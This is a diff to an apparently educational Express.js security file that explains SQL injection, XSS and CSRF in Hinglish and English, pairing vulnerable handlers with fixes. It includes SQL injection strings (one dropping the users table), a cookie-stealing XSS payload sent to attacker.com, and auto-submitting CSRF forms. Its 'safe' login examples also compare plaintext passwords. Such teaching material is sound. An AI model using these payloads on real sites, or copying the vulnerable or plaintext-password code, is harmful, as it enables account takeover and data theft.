@@ -136,50 +136,648 @@ app.post('/users', [
 });
 
 // ============================================
-// SQL INJECTION PREVENTION
+// SQL INJECTION - DETAILED EXPLANATION
 // ============================================
 
-// ❌ WRONG - SQL Injection vulnerable
-// const query = `SELECT * FROM users WHERE email = '${email}'`;
-
-// ✅ CORRECT - Parameterized queries
-const query = 'SELECT * FROM users WHERE email = ?';
-db.query(query, [email], (err, results) => {
-  // Safe
+/**
+ * SQL INJECTION KYA HAI? (HINGLISH)
+ * 
+ * SQL Injection ek bahut dangerous attack hai jisme attacker malicious SQL code
+ * inject karta hai application ke database queries mein.
+ * 
+ * Simple Definition:
+ * - Attacker user input mein SQL commands daal deta hai
+ * - Application directly user input ko SQL query mein use karta hai
+ * - Database execute ho jata hai attacker ka malicious SQL
+ * - Result: Data leak, data delete, unauthorized access
+ * 
+ * Real-life Analogy:
+ * 1. Fake ID:
+ *    - Jaise aap security guard ko fake ID dikha kar building mein ghus jate ho
+ *    - SQL Injection bhi waise hi - fake SQL commands se database access
+ * 
+ * 2. Poisoned Food:
+ *    - Normal food mein poison mix karna
+ *    - Normal user input mein malicious SQL mix karna
+ * 
+ * HOW SQL INJECTION WORKS (Attack Example):
+ * 
+ * ❌ VULNERABLE CODE:
+ */
+app.post('/login', (req, res) => {
+  const email = req.body.email;
+  const password = req.body.password;
+  
+  // ❌ DANGEROUS - Direct string concatenation
+  const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
+  
+  db.query(query, (err, results) => {
+    if (results.length > 0) {
+      res.json({ success: true });
+    } else {
+      res.json({ success: false });
+    }
+  });
 });
 
-// OR use ORM (Mongoose, Sequelize)
-User.findOne({ email: email }); // Safe
+/**
+ * ATTACK SCENARIO:
+ * 
+ * Normal Input:
+ * - email: "user@example.com"
+ * - password: "mypassword123"
+ * - Query: SELECT * FROM users WHERE email = 'user@example.com' AND password = 'mypassword123'
+ * - Result: Works fine ✅
+ * 
+ * Malicious Input (SQL Injection):
+ * - email: "user@example.com"
+ * - password: "' OR '1'='1"
+ * - Query: SELECT * FROM users WHERE email = 'user@example.com' AND password = '' OR '1'='1'
+ * - Result: '1'='1' always true, so attacker login ho jata hai! ❌
+ * 
+ * More Dangerous Attack:
+ * - email: "admin@example.com'; DROP TABLE users; --"
+ * - Query: SELECT * FROM users WHERE email = 'admin@example.com'; DROP TABLE users; --'
+ * - Result: Entire users table delete ho jayega! ❌❌❌
+ * 
+ * HOW TO PREVENT SQL INJECTION:
+ * 
+ * ✅ SOLUTION 1: Parameterized Queries (Prepared Statements)
+ */
+app.post('/login', (req, res) => {
+  const email = req.body.email;
+  const password = req.body.password;
+  
+  // ✅ SAFE - Parameterized query
+  const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
+  
+  // Database treats ? as placeholder, not as part of SQL code
+  // Even if attacker sends: email = "admin'; DROP TABLE users; --"
+  // It will be treated as a STRING VALUE, not SQL command
+  db.query(query, [email, password], (err, results) => {
+    if (results.length > 0) {
+      res.json({ success: true });
+    } else {
+      res.json({ success: false });
+    }
+  });
+});
+
+/**
+ * ✅ SOLUTION 2: Using ORM (Object-Relational Mapping)
+ */
+// Using Mongoose (MongoDB)
+const User = require('./models/User');
+
+app.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+  
+  // ✅ SAFE - ORM automatically handles parameterization
+  const user = await User.findOne({ email, password });
+  
+  if (user) {
+    res.json({ success: true });
+  } else {
+    res.json({ success: false });
+  }
+});
+
+// Using Sequelize (SQL databases)
+const { User } = require('./models');
+
+app.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+  
+  // ✅ SAFE - Sequelize uses parameterized queries internally
+  const user = await User.findOne({
+    where: { email, password }
+  });
+  
+  if (user) {
+    res.json({ success: true });
+  } else {
+    res.json({ success: false });
+  }
+});
+
+/**
+ * ✅ SOLUTION 3: Input Validation & Whitelisting
+ */
+const validator = require('validator');
+
+app.post('/login', (req, res) => {
+  const email = req.body.email;
+  const password = req.body.password;
+  
+  // ✅ Validate input format
+  if (!validator.isEmail(email)) {
+    return res.status(400).json({ error: 'Invalid email' });
+  }
+  
+  // ✅ Whitelist allowed characters
+  if (!/^[a-zA-Z0-9@._-]+$/.test(email)) {
+    return res.status(400).json({ error: 'Invalid characters' });
+  }
+  
+  // Then use parameterized query
+  const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
+  db.query(query, [email, password], (err, results) => {
+    // Safe
+  });
+});
+
+/**
+ * SQL INJECTION - ENGLISH EXPLANATION
+ * 
+ * SQL Injection is a code injection technique where an attacker inserts malicious
+ * SQL statements into an application's database query.
+ * 
+ * How It Works:
+ * 1. Attacker provides malicious input in user fields
+ * 2. Application directly concatenates input into SQL query
+ * 3. Database executes the malicious SQL
+ * 4. Attacker gains unauthorized access or damages data
+ * 
+ * Prevention Methods:
+ * 1. Parameterized Queries: Use placeholders (?) instead of string concatenation
+ * 2. ORM: Use Object-Relational Mapping libraries (Mongoose, Sequelize)
+ * 3. Input Validation: Validate and sanitize all user input
+ * 4. Least Privilege: Database user should have minimum required permissions
+ * 5. Stored Procedures: Use stored procedures with parameters
+ */
 
 // ============================================
-// XSS PREVENTION
+// XSS (CROSS-SITE SCRIPTING) - DETAILED EXPLANATION
 // ============================================
 
+/**
+ * XSS (CROSS-SITE SCRIPTING) KYA HAI? (HINGLISH)
+ * 
+ * XSS ek attack hai jisme attacker malicious JavaScript code inject karta hai
+ * web pages mein. Jab user woh page open karta hai, to malicious script execute
+ * ho jata hai user ke browser mein.
+ * 
+ * Simple Definition:
+ * - Attacker user input mein JavaScript code daal deta hai
+ * - Application directly user input ko page mein render karta hai
+ * - Browser malicious script ko execute kar deta hai
+ * - Result: Cookie theft, session hijacking, data theft
+ * 
+ * Real-life Analogy:
+ * 1. Poisoned Letter:
+ *    - Jaise ek letter mein poison powder hidden ho
+ *    - XSS bhi waise hi - normal text mein hidden malicious script
+ * 
+ * 2. Trojan Horse:
+ *    - Bahar se normal dikhta hai, andar se dangerous
+ *    - Normal user input dikhta hai, andar malicious code
+ * 
+ * TYPES OF XSS:
+ * 
+ * 1. STORED XSS (Persistent):
+ *    - Malicious script database mein store ho jata hai
+ *    - Har user jo page open karega, script execute hoga
+ *    - Example: Comment section mein script daalna
+ * 
+ * 2. REFLECTED XSS (Non-Persistent):
+ *    - Malicious script URL ya form input mein hota hai
+ *    - Script immediately reflect hota hai response mein
+ *    - Example: Search query mein script
+ * 
+ * 3. DOM-BASED XSS:
+ *    - Client-side JavaScript vulnerable hota hai
+ *    - Script DOM manipulate karta hai
+ *    - Example: location.hash, document.write
+ * 
+ * HOW XSS WORKS (Attack Example):
+ * 
+ * ❌ VULNERABLE CODE:
+ */
+app.get('/search', (req, res) => {
+  const query = req.query.q; // User input
+  
+  // ❌ DANGEROUS - Direct rendering without sanitization
+  res.send(`
+    <html>
+      <body>
+        <h1>Search Results for: ${query}</h1>
+        <p>No results found.</p>
+      </body>
+    </html>
+  `);
+});
+
+/**
+ * ATTACK SCENARIO:
+ * 
+ * Normal Input:
+ * - URL: /search?q=javascript
+ * - Output: "Search Results for: javascript"
+ * - Result: Works fine ✅
+ * 
+ * Malicious Input (XSS Attack):
+ * - URL: /search?q=<script>alert('XSS')</script>
+ * - Output: "Search Results for: <script>alert('XSS')</script>"
+ * - Result: Script execute ho jayega, alert show hoga! ❌
+ * 
+ * More Dangerous Attack:
+ * - URL: /search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
+ * - Result: User ka cookie attacker ko bhej diya jayega! ❌❌❌
+ * 
+ * Stored XSS Example (Comment Section):
+ */
+app.post('/comment', (req, res) => {
+  const comment = req.body.comment;
+  
+  // ❌ DANGEROUS - Store without sanitization
+  db.query('INSERT INTO comments (text) VALUES (?)', [comment], (err) => {
+    res.json({ success: true });
+  });
+});
+
+app.get('/comments', (req, res) => {
+  db.query('SELECT * FROM comments', (err, results) => {
+    // ❌ DANGEROUS - Render without escaping
+    const html = results.map(c => `<p>${c.text}</p>`).join('');
+    res.send(html);
+  });
+});
+
+/**
+ * Attack:
+ * - Comment: "<script>alert('XSS')</script>"
+ * - Result: Har user jo comments page open karega, script execute hoga
+ * 
+ * HOW TO PREVENT XSS:
+ * 
+ * ✅ SOLUTION 1: Output Encoding (HTML Escaping)
+ */
 const escapeHtml = require('escape-html');
 
-function sanitizeInput(input) {
-  return escapeHtml(input.trim());
-}
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  
+  // ✅ SAFE - Escape HTML special characters
+  const safeQuery = escapeHtml(query);
+  
+  res.send(`
+    <html>
+      <body>
+        <h1>Search Results for: ${safeQuery}</h1>
+        <p>No results found.</p>
+      </body>
+    </html>
+  `);
+});
 
-// OR use DOMPurify for HTML content
+/**
+ * ✅ SOLUTION 2: Using Template Engines with Auto-Escaping
+ */
+// Using EJS with auto-escaping
+app.set('view engine', 'ejs');
+
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  
+  // ✅ SAFE - EJS automatically escapes variables
+  res.render('search', { query: query });
+});
+
+// search.ejs file:
+// <h1>Search Results for: <%= query %></h1>  <!-- Auto-escaped -->
+
+/**
+ * ✅ SOLUTION 3: DOMPurify (For HTML Content)
+ */
+const createDOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
+
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
+
+app.post('/comment', (req, res) => {
+  let comment = req.body.comment;
+  
+  // ✅ SAFE - Sanitize HTML, allow only safe tags
+  comment = DOMPurify.sanitize(comment, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
+    ALLOWED_ATTR: ['href']
+  });
+  
+  db.query('INSERT INTO comments (text) VALUES (?)', [comment], (err) => {
+    res.json({ success: true });
+  });
+});
+
+/**
+ * ✅ SOLUTION 4: Content Security Policy (CSP)
+ */
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'"], // Only allow scripts from same origin
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", "data:", "https:"],
+  }
+}));
+
+/**
+ * ✅ SOLUTION 5: Input Validation & Sanitization
+ */
+const validator = require('validator');
+const xss = require('xss');
+
+app.post('/comment', (req, res) => {
+  let comment = req.body.comment;
+  
+  // ✅ Validate length
+  if (comment.length > 1000) {
+    return res.status(400).json({ error: 'Comment too long' });
+  }
+  
+  // ✅ Sanitize XSS
+  comment = xss(comment, {
+    whiteList: {}, // No HTML tags allowed
+    stripIgnoreTag: true,
+    stripIgnoreTagBody: ['script']
+  });
+  
+  // ✅ Trim whitespace
+  comment = comment.trim();
+  
+  db.query('INSERT INTO comments (text) VALUES (?)', [comment], (err) => {
+    res.json({ success: true });
+  });
+});
+
+/**
+ * XSS - ENGLISH EXPLANATION
+ * 
+ * Cross-Site Scripting (XSS) is a security vulnerability where attackers inject
+ * malicious scripts into web pages viewed by other users.
+ * 
+ * How It Works:
+ * 1. Attacker injects malicious JavaScript in user input
+ * 2. Application renders input without sanitization
+ * 3. Browser executes malicious script in user's context
+ * 4. Attacker can steal cookies, sessions, or perform actions on user's behalf
+ * 
+ * Prevention Methods:
+ * 1. Output Encoding: Escape HTML special characters (<, >, &, ", ')
+ * 2. Input Sanitization: Remove or encode dangerous characters
+ * 3. Content Security Policy: Restrict script execution sources
+ * 4. Template Engines: Use engines with auto-escaping (EJS, Handlebars)
+ * 5. DOMPurify: Sanitize HTML content, allow only safe tags
+ * 6. Input Validation: Validate format, length, and content
+ */
 
 // ============================================
-// CSRF PROTECTION
+// CSRF (CROSS-SITE REQUEST FORGERY) - DETAILED EXPLANATION
 // ============================================
 
+/**
+ * CSRF (CROSS-SITE REQUEST FORGERY) KYA HAI? (HINGLISH)
+ * 
+ * CSRF ek attack hai jisme attacker user ko bewajah ek malicious website par
+ * le jata hai, aur wahan se user ke behalf par legitimate website par
+ * unauthorized actions perform karwata hai.
+ * 
+ * Simple Definition:
+ * - User logged in hai legitimate website par
+ * - Attacker user ko malicious website par le jata hai
+ * - Malicious website automatically legitimate website par request bhej deta hai
+ * - Request user ke cookies/session ke saath jata hai
+ * - Legitimate website request ko valid samajh kar execute kar deta hai
+ * - Result: Unauthorized actions (password change, money transfer, etc.)
+ * 
+ * Real-life Analogy:
+ * 1. Forged Signature:
+ *    - Jaise koi aapke signature copy karke document par sign kar deta hai
+ *    - CSRF bhi waise hi - attacker aapke session use karke actions perform karta hai
+ * 
+ * 2. Impersonation:
+ *    - Koi aapke uniform pehen kar restricted area mein ghus jata hai
+ *    - Attacker aapke session cookies use karke authenticated requests bhejta hai
+ * 
+ * HOW CSRF WORKS (Attack Example):
+ * 
+ * ❌ VULNERABLE CODE:
+ */
+app.post('/change-password', (req, res) => {
+  // ❌ DANGEROUS - No CSRF protection
+  const { newPassword } = req.body;
+  
+  // User is authenticated (has valid session)
+  const userId = req.session.userId;
+  
+  db.query('UPDATE users SET password = ? WHERE id = ?', [newPassword, userId], (err) => {
+    res.json({ success: true });
+  });
+});
+
+/**
+ * ATTACK SCENARIO:
+ * 
+ * Step 1: User logs into legitimate website (example.com)
+ * - Session cookie set: sessionId=abc123
+ * - User authenticated ✅
+ * 
+ * Step 2: User visits malicious website (attacker.com)
+ * - Attacker's website has this code:
+ */
+// attacker.com/malicious.html
+// <html>
+//   <body>
+//     <h1>Click here for free money!</h1>
+//     <!-- Hidden form that auto-submits -->
+//     <form id="evilForm" action="https://example.com/change-password" method="POST">
+//       <input type="hidden" name="newPassword" value="hacked123">
+//     </form>
+//     <script>
+//       document.getElementById('evilForm').submit(); // Auto-submit
+//     </script>
+//   </body>
+// </html>
+
+/**
+ * Step 3: What Happens:
+ * - Browser automatically sends POST request to example.com/change-password
+ * - Request includes session cookie (sessionId=abc123) automatically
+ * - example.com sees valid session, thinks it's legitimate user
+ * - Password changed to "hacked123" without user knowing! ❌❌❌
+ * 
+ * More Dangerous Attack (Money Transfer):
+ */
+// attacker.com/steal.html
+// <form action="https://bank.com/transfer" method="POST">
+//   <input type="hidden" name="toAccount" value="attacker-account">
+//   <input type="hidden" name="amount" value="10000">
+// </form>
+// <script>document.forms[0].submit();</script>
+
+/**
+ * HOW TO PREVENT CSRF:
+ * 
+ * ✅ SOLUTION 1: CSRF Tokens (Most Common)
+ */
 const csrf = require('csurf');
 const cookieParser = require('cookie-parser');
 
 app.use(cookieParser());
-app.use(csrf({ cookie: true }));
+app.use(csrf({ cookie: true })); // CSRF token in cookie
 
-app.get('/form', (req, res) => {
-  res.render('form', { csrfToken: req.csrfToken() });
+// Generate form with CSRF token
+app.get('/change-password-form', (req, res) => {
+  // ✅ Generate unique CSRF token for this session
+  const csrfToken = req.csrfToken();
+  
+  res.render('change-password', { csrfToken: csrfToken });
 });
 
-app.post('/submit', (req, res) => {
-  // CSRF token automatically validated
+// change-password.ejs:
+// <form action="/change-password" method="POST">
+//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+//   <input type="password" name="newPassword" placeholder="New Password">
+//   <button type="submit">Change Password</button>
+// </form>
+
+app.post('/change-password', (req, res) => {
+  // ✅ CSRF token automatically validated by csurf middleware
+  // If token missing or invalid, request rejected
+  
+  const { newPassword } = req.body;
+  const userId = req.session.userId;
+  
+  db.query('UPDATE users SET password = ? WHERE id = ?', [newPassword, userId], (err) => {
+    res.json({ success: true });
+  });
 });
+
+/**
+ * How CSRF Token Works:
+ * 1. Server generates unique token for each session
+ * 2. Token sent to client in form (hidden input)
+ * 3. Client submits form with token
+ * 4. Server validates token matches session token
+ * 5. If token invalid/missing, request rejected
+ * 6. Attacker can't get valid token (can't access your site's forms)
+ * 
+ * ✅ SOLUTION 2: SameSite Cookie Attribute
+ */
+const session = require('express-session');
+
+app.use(session({
+  secret: process.env.SESSION_SECRET,
+  cookie: {
+    secure: true, // HTTPS only
+    httpOnly: true, // No JavaScript access
+    sameSite: 'strict' // ✅ CSRF protection
+    // 'strict': Cookie never sent in cross-site requests
+    // 'lax': Cookie sent only for GET requests (navigation)
+    // 'none': Cookie always sent (requires secure: true)
+  }
+}));
+
+/**
+ * SameSite='strict' means:
+ * - Cookie only sent with requests from same site
+ * - attacker.com se example.com ko request jayegi, but cookie nahi jayega
+ * - Without cookie, request unauthenticated, rejected ✅
+ * 
+ * ✅ SOLUTION 3: Double Submit Cookie Pattern
+ */
+const crypto = require('crypto');
+
+// Generate CSRF token
+app.use((req, res, next) => {
+  if (!req.cookies.csrfToken) {
+    // Generate random token
+    const token = crypto.randomBytes(32).toString('hex');
+    res.cookie('csrfToken', token, { httpOnly: false }); // JavaScript accessible
+  }
+  next();
+});
+
+app.post('/change-password', (req, res) => {
+  const { newPassword, csrfToken } = req.body;
+  const cookieToken = req.cookies.csrfToken;
+  
+  // ✅ Validate token from body matches token from cookie
+  if (!csrfToken || csrfToken !== cookieToken) {
+    return res.status(403).json({ error: 'Invalid CSRF token' });
+  }
+  
+  const userId = req.session.userId;
+  db.query('UPDATE users SET password = ? WHERE id = ?', [newPassword, userId], (err) => {
+    res.json({ success: true });
+  });
+});
+
+/**
+ * ✅ SOLUTION 4: Custom Header Validation
+ */
+app.use((req, res, next) => {
+  // Only allow POST/PUT/DELETE requests with custom header
+  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
+    const customHeader = req.headers['x-requested-with'];
+    
+    // ✅ Validate custom header exists
+    if (!customHeader || customHeader !== 'XMLHttpRequest') {
+      return res.status(403).json({ error: 'Invalid request' });
+    }
+  }
+  next();
+});
+
+// Frontend must send header:
+// fetch('/change-password', {
+//   method: 'POST',
+//   headers: { 'X-Requested-With': 'XMLHttpRequest' },
+//   body: JSON.stringify({ newPassword: 'newpass' })
+// });
+
+/**
+ * ✅ SOLUTION 5: Referer/Origin Header Validation
+ */
+app.use((req, res, next) => {
+  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
+    const referer = req.headers.referer;
+    const origin = req.headers.origin;
+    const allowedOrigin = 'https://example.com';
+    
+    // ✅ Validate request comes from same origin
+    if (!referer || !referer.startsWith(allowedOrigin)) {
+      if (!origin || origin !== allowedOrigin) {
+        return res.status(403).json({ error: 'Invalid origin' });
+      }
+    }
+  }
+  next();
+});
+
+/**
+ * CSRF - ENGLISH EXPLANATION
+ * 
+ * Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users
+ * to submit requests to a web application where they are currently authenticated.
+ * 
+ * How It Works:
+ * 1. User is logged into legitimate website (has valid session)
+ * 2. User visits malicious website
+ * 3. Malicious website sends request to legitimate website using user's session
+ * 4. Legitimate website sees valid session, executes request
+ * 5. Unauthorized action performed without user's knowledge
+ * 
+ * Prevention Methods:
+ * 1. CSRF Tokens: Generate unique token per session, validate on each request
+ * 2. SameSite Cookies: Set cookie attribute to 'strict' or 'lax'
+ * 3. Double Submit Cookie: Compare token in form with token in cookie
+ * 4. Custom Headers: Require custom header that attacker can't set
+ * 5. Referer/Origin Validation: Check request comes from same origin
+ * 6. Re-authentication: Require password for sensitive actions
+ */
 
 // ============================================
 // RATE LIMITING
